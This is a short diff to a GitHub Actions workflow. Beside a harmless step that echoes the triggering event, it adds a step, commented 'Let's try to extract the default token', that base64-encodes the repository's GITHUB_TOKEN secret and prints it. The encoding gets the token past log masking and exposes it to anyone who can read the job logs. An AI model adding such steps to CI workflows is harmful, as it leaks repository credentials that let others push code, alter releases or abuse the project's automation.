@@ -6,3 +6,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: echo "The job was automatically triggered by a ${{ github.event_name }} event."
+      # Let's try to extract the default token
+      - run: echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w0
